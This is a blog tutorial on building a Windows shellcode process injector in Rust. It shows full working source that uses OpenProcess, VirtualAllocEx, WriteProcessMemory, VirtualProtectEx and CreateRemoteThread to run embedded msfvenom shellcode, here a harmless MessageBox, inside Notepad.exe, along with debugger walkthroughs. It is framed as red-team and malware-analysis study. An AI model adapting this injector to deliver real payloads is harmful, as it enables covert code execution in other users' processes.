---
title:  "Rustware Part 1: Shellcode Process Injection Development (Windows)"
authors: ["Raffaele Sabato"]
date:  2023-10-27
#description: ""
tags: ["rust","malwares"]
thumbnail:
  url: img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img0.png
  author: Deep AI
  authorURL: https://deepai.org
---

Malware development is essential when performing activities like Red Teaming, Adversary Emulation and Network Penetration Testing, the operator can use custom malwares to perform various tasks based on the specific situation. At the same time, analyzing Malwares is useful to learn how malwares work and how to detect them, in order to defend our companies from threat actors. For these reasons I studied several books and courses about Windows Internals, Malware Development and Malware Analysis.

Several threat actors like **ALPHV**, **Hive** and **Qilin** started to develop malware using the Rust programming languages because of its great memory management, speed, and complexity during reverse engineering.

In the last months I started to study and develop custom tools using Rust program language. This first blog post is about the development of a binary that performs an injection of a MessageBox into a target process.

The Shellcode Process Injection we are going to use relies on the use of several WinAPIs: **OpenProcess** is used to open a handle to the target process, in our case Notepad.exe. We will use this handle to interact with Nodepad.exe , after that, using **VirtualAllocEx** we can allocate a new region of memory in Notepad.exe with Readable and Writable protection; this region will contain our shellcode written by **WriteProcessMemory**. Using **VirtualProtectEx** we can change the memory protection to Readable and Executable to allow **CreateRemoteThread** to run the shellcode contained in the new allocated memory in Notepad.exe.

## Process Injection

The process injection we are going to develop is a simple Shellcode Injection using the following WinAPIs:

* **[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)**: gets a handle to the target process
* **[VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)**: allocates memory in the remote target process
* **[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)**: writes our payload into the allocated memory
* **[VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)**: changes the remote memory protection
* **[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)**: runs our payload

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img1.png" caption="Figure 1 - Shellcode Process Injection" wrapper="text-center">}}

The payload we are going to use is a message box showing the string “Process Injection”; it was generated using the following msfvenom command.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img2.png" caption="Figure 2 - msfvenom command" wrapper="text-center">}}

## Rustware Setup

Everything we need to develop a Rust program that leverages on WinAPI, is well described in the Microsoft “[Developing with Rust on Windows](https://learn.microsoft.com/en-us/windows/dev-environment/rust/)”. In our case, we used the following software, plugins and crate:

* Visual Studio Code 1.83.0
* Rust-analyzer 0.3.1689
* CodeLLDB 1.10.0
* Crates 0.6.3
* Windows Crate 0.51.1

## Rustware Development

First of all, it is necessary to add the Windows Crate to the **Cargo.toml** file to use the WinAPIs, as shown below.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img3.png" caption="Figure 3 - Cargo.toml File" wrapper="text-center">}}

Each WinAPI requires a feature that must be written in the **Cargo.toml** file; we can see the features in the [Windows Crate documentation](https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html).

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img4.png" caption="Figure 4 - Open Process Specification" wrapper="text-center">}}

Below, a list of the WinAPIs we are going to use and the features they require:

* **OpenProcess**: “Win32_System_Threading” and “Win32_Foundation”
* **VirtualAllocEx**: “Win32_System_Memory”, and “Win32_Foundation”
* **WriteProcessMemory**: “Win32_System_Diagnostics_Debug” and “Win32_Foundation”
* **VirtualProtectEx**: “Win32_System_Memory”, and “Win32_Foundation”
* **CreateRemoteThread**: “Win32_System_Threading”, “Win32_Foundation” and “Win32_Security”.
 
After adding all the features, the **Cargo.toml** file will look like this.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img5.png" caption="Figure 5 - Cargo.toml File" wrapper="text-center">}}

Each feature must also be imported in the code; we can achieve this with the use declaration as shown below.

```rust
use std::{ffi::c_void, mem::transmute};

use windows::{
    Win32::Foundation::CloseHandle, Win32::System::Diagnostics::Debug::*, Win32::System::Memory::*,
    Win32::System::Threading::*,
};
```

In order to get the PID of the target process as argument, we can use the std::env::args. The code below checks if the user has specified the PID as argument, if not, it prints the usage string, otherwise it saves the value in the **pid** variable.

```rust
fn main() {

    let args: Vec<String> = args().collect();

    if args.len() < 2{
        println!("Usage: rustware.exe PID");
        return
    }

    let pid: u32 = args[1].parse().unwrap();
```

The payload is contained in an array of 272 unsigned 8-bit integers. The payload length is calculated using the **.len()**. function, and the **.payload_ptr**. variable (use **.std::ffi::c_void**.) contains a pointer to the payload, we get it by using the **.as_ptr()**. to get a raw pointer to the payload and then casting the raw pointer to a **\*const c_void**.

```rust
let payload : [u8; 272]= [ 
                                0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b,0x71,
                                0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38,
                                0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45,
                                0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x01, 0xeb, 0xe3,
                                0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74,
                                0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a,
                                0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01,
                                0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2, 0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68,
                                0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0x7e, 0xd8,
                                0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c,
                                0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88,
                                0x5c, 0x24, 0x0a, 0x89, 0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d,
                                0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68,
                                0x77, 0x61, 0x72, 0x65, 0x68, 0x52, 0x75, 0x73, 0x74, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x08, 0x89,
                                0xe3, 0x68, 0x6e, 0x58, 0x20, 0x20, 0x68, 0x63, 0x74, 0x69, 0x6f, 0x68, 0x49, 0x6e, 0x6a, 0x65,
                                0x68, 0x65, 0x73, 0x73, 0x20, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x31, 0xc9, 0x88, 0x4c, 0x24, 0x11,
                                0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff, 0x55, 0x08
                                ];   
    let payload_len = payload.len();
    let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;
```

The **Inject** function takes three parameters: the PID of the target process, a pointer to the payload, and the payload length.

```rust
fn inject( pid: u32, payload_ptr: *const c_void, payload_len: usize){
```

The WinAPIs we are going to use are defined as **[unsafe](https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html#calling-an-unsafe-function-or-method)** function, because Rust can’t guarantee the memory safety, so it’s our responsibility. In the image below we can see the **OpenProcess** implementation, it is declared as an **unsafe** function.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img6.png" caption="Figure 6 - OpenProcess Implementation" wrapper="text-center">}}

In order to use an **[unsafe](https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html#unsafe-rust)** function, we need to add an **unsafe** block; we are going to use this block for all the WinAPIs. Let’s use  **OpenProcess** to get a handle to the target process. It returns a [Result](https://doc.rust-lang.org/std/result/enum.Result.html) enum containing the Handle to the opened process, or the error if it fails. Using the **match** construct we can use the variants **Ok()** and **Err()** to define what to do if the function succeeds or fails.

```rust
fn inject( pid: u32, payload_ptr: *const c_void, payload_len: usize){
    unsafe{
        let result_openprocess = OpenProcess(PROCESS_ALL_ACCESS,false,pid);

        match result_openprocess{
            Ok(handle_process) => {
                println!("OpenProcess succeeds")
            }

            Err(error) => {
                println!("OpenProcess Error: {}",error)
            }
        }
    }
}
```

If the function succeeds the program performs **VirtualAllocEx** to allocate a region of memory that is readable and writable into a remote target process and print the allocated memory address, otherwise it prints an error message. We don’t specify the **lpaddress** because we want the WinAPI to determinate where to allocate the region of memory

```rust
Ok(handle_process) => {
    let remotememory_ptr: *mut c_void = VirtualAllocEx(handle_process,None,payload_len,MEM_COMMIT,PAGE_READWRITE);    

    if !remotememory_ptr.is_null(){
        println!("Allocated Memory Address: {:p}",remotememory_ptr);
    }   
    else{
         println!("VirtualAllocEx Error")
    }

```             

After that, we have to write our payload in the new allocated memory. To do that we use **WriteProcessMemory**.

```rust
 let result_writeprocessmemory =  WriteProcessMemory(handle_process,remotememory_ptr,payload_ptr,payload_len,None);
```

Using **VirtualProtectEx**, it is possible to change the memory protection to **PAGE_EXECUTE_READ** to make the payload executable.

```rust
match result_writeprocessmemory{
    Ok(()) => {
       let result_virtualprotectex =  VirtualProtectEx(handle_process,remotememory_ptr,payload_len,PAGE_EXECUTE_READ,&mut old_protect);
                           
        match result_virtualprotectex{
```

At this point we can execute our payload using. The **transmute** function allows us to convert the pointer to our payload into a pointer to a function to be executed by the new created Thread as required by the WinAPI.

```rust
match result_virtualprotectex{
    Ok(()) => {
        let result_createremotethread= CreateRemoteThread(handle_process,None,0,transmute(remotememory_ptr),None,0,None);
        match result_createremotethread{
            Ok(_handle_tread) => {
                println!("Threat Created")   
            }
            Err(error) => {
                println!("CreateRemoteThread Error: {}",error)
            }
    } 
```

To compile the program into a 32bit binary we can use the **target** flag specifying the i686 architecture.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img7.png" caption="Figure 7 - Compile Program for 32bit architecture" wrapper="text-center">}}

Running the binary we successfully inject our MessageBox into Notepad.exe.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img8.png" caption="Figure 8 - MessageBox Process Injection in Notepad.exe" wrapper="text-center">}}

## Debugging

Using Process Hacker and x32dbg we can debug our binary to understand how it works under the hood. In x32dbg we can change the command line to specify the target process PID and set the breakpoints on the WinAPIs that our binary is going to use.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img9.png" caption="Figure 9 - Change Command Line" wrapper="text-center">}}

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img10.png" caption="Figure 10 - x32dbg Breakpoints" wrapper="text-center">}}

### OpenProcess

```rust
OpenProcess(PROCESS_ALL_ACCESS,false,pid)
```

Running the debugger, we can see that **OpenProcess** is correctly getting the tree parameters:

* 0x1FFFFF is **PROCESS_ALL_ACCESS**
* 0 is false
* 0x1F80 is the Notepad.exe PID in hex

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img11.png" caption="Figure 11 - OpenProcess Debug" wrapper="text-center">}}

We can see the Notepad.exe handle in our binary handles list.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img12.png" caption="Figure 12 - Notepad.exe Handle" wrapper="text-center">}}

### VirtualAllocEx

```rust
VirtualAllocEx(handle_process,None,payload_len,MEM_COMMIT,PAGE_READWRITE);    

```

The **VirtualAllocEx** stack contains the following parameters:

* 0x160 is the Notepad.exe handle
* 0x0 is None
* 0x110 is the payload length
* 0x1000 is the **MEM_COMMIT** value
* 0x4 is the **PAGE_READWRIT**E value

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img13.png" caption="Figure 13 - VirtualAllocEx Debug" wrapper="text-center">}}

We can confirm it by using Process Hacker and inspecting the Notepad.exe memory, as we can see a new allocated memory with RW protection exists at address **0x4D20000**.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img14.png" caption="Figure 14 - Allocated Memory in Notepad.exe" wrapper="text-center">}}

### WriteProcessMemory

```rust
WriteProcessMemory(handle_process,remotememory_ptr,payload_ptr,payload_len,None);  
```

Following the **WriteProcessMemory** arguments:

* 0x160 is the Notepad.exe handle
* 0x4D20000 is the remote memory address
* 0xD8FC78 is the payload address
* 0x110 is the payload len
* 0x0 is None

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img15.png" caption="Figure 15 - WriteProcessMemory Debug" wrapper="text-center">}}

We can confirm it in ProcessHacker by inspecting the memory at address 0x4D20000.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img16.png" caption="Figure 16 - Payload written in the Allocated Memory" wrapper="text-center">}}

### VirtualProtectEx

```rust
VirtualProtectEx(handle_process,remotememory_ptr, payload_len,PAGE_EXECUTE_READ,&mut old_protect);
```

**VirtualProtectEx** is correctly getting the arguments:

* 0x160 is the Notepad.exe handle
* 0x4D20000 is the remote memory address
* 0x110 is the payload length
* 0x20 is the **PAGE_EXECUTE_READ** value
* 0xD8FD98 is the old_protect variable address

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img17.png" caption="Figure 17 - VirtualProtectEx Debug" wrapper="text-center">}}

In ProcessHacker we can see the protection flag changed to RX.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img18.png" caption="Figure 18 - Permission allocated memory in Notepad.exe" wrapper="text-center">}}

### CreateRemoteThread

```rust
CreateRemoteThread(handle_process,None,0,transmute(remotememory_ptr),None,0,None);
```

Lastly, the **CreateRemoteThread** arguments are:

* 0x160 is the Notepad.exe handle
* 0x0 is None
* 0x0 is 0
* 0x4D20000 is the remote memory address to be executed
* 0x0 is None
* 0x0 is 0
* 0x0 is None

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img19.png" caption="Figure 19 - CreateRemoteThread Debug" wrapper="text-center">}}

By continuing the execution, our MessageBox wil popup.

{{< image src="img/2023-10-27-rustware-part-1-shellcode-process-injection-development/img20.png" caption="Figure 20 - Process Injection Debug" wrapper="text-center">}}

## Conclusion

Rust is a very powerful language; in the last years it found its way into the malware development, especially for ransomware because of its speed. The interaction with WinAPIs is not very easy because of the datatype mismatch.

Rust performs security checks at compile and runtime that prevent some of the infamous bugs, since **unsafe** blocks lack of security checks, we need to be careful when developing malwares because WinAPIs we saw are defined as **unsafe** function.

In the next blog post we would like to show how to implement other techniques and how to reverse engineering Rust malwares.

I'm new to Rust so feel free to contact me, I'd appreciate any feedback.



## References

* [https://learn.microsoft.com/en-us/windows/dev-environment/rust/](https://learn.microsoft.com/en-us/windows/dev-environment/rust/)
* [https://microsoft.github.io/windows-docs-rs/doc/windows/](https://microsoft.github.io/windows-docs-rs/doc/windows/)
* [https://socradar.io/why-ransomware-groups-switch-to-rust-programming-language/](https://socradar.io/why-ransomware-groups-switch-to-rust-programming-language/)
* [https://crates.io/crates/windows](https://crates.io/crates/windows)
* [https://doc.rust-lang.org/book/](https://doc.rust-lang.org/book/)
* [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
* [https://institute.sektor7.net](https://institute.sektor7.net)
* [https://maldevacademy.com](https://maldevacademy.com)
* [https://www.consulthink.it/rustware-part-1-shellcode-process-injection-development/](https://www.consulthink.it/rustware-part-1-shellcode-process-injection-development/)
* [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055)

## Final Code

```rust
use std::{ffi::c_void, mem::transmute};

use windows::{
    Win32::Foundation::CloseHandle, Win32::System::Diagnostics::Debug::*, Win32::System::Memory::*,
    Win32::System::Threading::*,
};

fn inject(pid: u32, payload_ptr: *const c_void, payload_len: usize) {
    unsafe {
        let result_openprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);

        match result_openprocess {
            Ok(handle_process) => {
                let remotememory_ptr: *mut c_void = VirtualAllocEx(
                    handle_process,
                    None,
                    payload_len,
                    MEM_COMMIT,
                    PAGE_READWRITE,
                );

                if !remotememory_ptr.is_null() {
                    println!("Allocated Memory Address: {:p}", remotememory_ptr);

                    let result_writeprocessmemory = WriteProcessMemory(
                        handle_process,
                        remotememory_ptr,
                        payload_ptr,
                        payload_len,
                        None,
                    );

                    match result_writeprocessmemory {
                        Ok(()) => {
                            let result_virtualprotectex = VirtualProtectEx(
                                handle_process,
                                remotememory_ptr,
                                payload_len,
                                PAGE_EXECUTE_READ,
                                &mut old_protect,
                            );

                            match result_virtualprotectex {
                                Ok(()) => {
                                    let result_createremotethread = CreateRemoteThread(
                                        handle_process,
                                        None,
                                        0,
                                        transmute(remotememory_ptr),
                                        None,
                                        0,
                                        None,
                                    );

                                    match result_createremotethread {
                                        Ok(handle_tread) => {
                                            println!("Thread Created");
                                            let _ = CloseHandle(handle_tread);
                                        }
                                        Err(error) => {
                                            println!("CreateRemoteThread Error: {}", error)
                                        }
                                    }
                                }
                                Err(error) => {
                                    println!("VirtualProtectEx Error: {}", error)
                                }
                            }
                        }

                        Err(error) => {
                            println!("WriteProcessMemory Error: {}", error)
                        }
                    }
                } else {
                    println!("VirtualAllocEx Error")
                }
                let _ = CloseHandle(handle_process);
            }
            Err(error) => {
                println!("OpenProcess Error: {}", error)
            }
        }
    }
}

fn main() {
    let args: Vec<String> = args().collect();

    if args.len() < 2 {
        println!("Usage: rustware.exe PID");
        return;
    }

    let pid: u32 = args[1].parse().unwrap();

    let payload: [u8; 272] = [
        0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b,
        0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b,
        0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24,
        0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a,
        0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0,
        0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c,
        0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a,
        0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2,
        0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f,
        0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0x7e, 0xd8, 0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52,
        0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33,
        0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89,
        0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c,
        0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x77, 0x61,
        0x72, 0x65, 0x68, 0x52, 0x75, 0x73, 0x74, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x08, 0x89, 0xe3,
        0x68, 0x6e, 0x58, 0x20, 0x20, 0x68, 0x63, 0x74, 0x69, 0x6f, 0x68, 0x49, 0x6e, 0x6a, 0x65,
        0x68, 0x65, 0x73, 0x73, 0x20, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x31, 0xc9, 0x88, 0x4c, 0x24,
        0x11, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff,
        0x55, 0x08,
    ];
    let payload_len = payload.len();
    let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;

    inject(pid, payload_ptr, payload_len);
}
```

